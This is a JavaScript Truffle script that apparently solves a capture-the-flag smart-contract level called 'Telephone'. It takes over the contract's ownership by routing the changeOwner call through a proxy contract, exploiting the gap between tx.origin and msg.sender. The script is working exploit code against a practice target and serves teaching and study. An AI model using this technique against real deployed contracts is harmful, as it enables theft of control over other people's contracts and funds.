const TelephoneContract = artifacts.require('Telephone')
const TelephoneAttackContract = artifacts.require('TelephoneAttack')
const assert = require('assert')

async function execute(callback) {
    /**
     * To be Telephone contract's owner, the address that calls changeOwner
     * should be different from the address that originates the transaction.
     * That means that the attacker cannot call changeOwner directly
     * because tx.origin would be equal to msg.sender.
     * 
     * The solution is to call a "proxy" contract in charge of actually calling
     * the changeOwner function of the victim contract. That way, tx.origin would be
     * the attacker address, while msg.sender would be the address of the "proxy" contract.
     */

    let victimContract = await TelephoneContract.deployed()
    let proxyContract = await TelephoneAttackContract.deployed()
    proxyContract.setVictim(victimContract.address)
    
    let attackerAccount = web3.eth.accounts[1]
    console.log(`Attacker account is ${attackerAccount}`)

    // Check original owner
    let contractOwner = await victimContract.owner.call()
    console.log(`Original owner ${contractOwner}`)
    
    // Change owner (check TelephoneAttack.sol to see the implementation of changeOwner)
    await proxyContract.changeOwner(attackerAccount, {
        from: attackerAccount
    })
    
    // Check final owner
    contractOwner = await victimContract.owner.call()
    assert.equal(contractOwner, attackerAccount)
    console.log(`New owner ${contractOwner}`)

    callback()
}

module.exports = execute
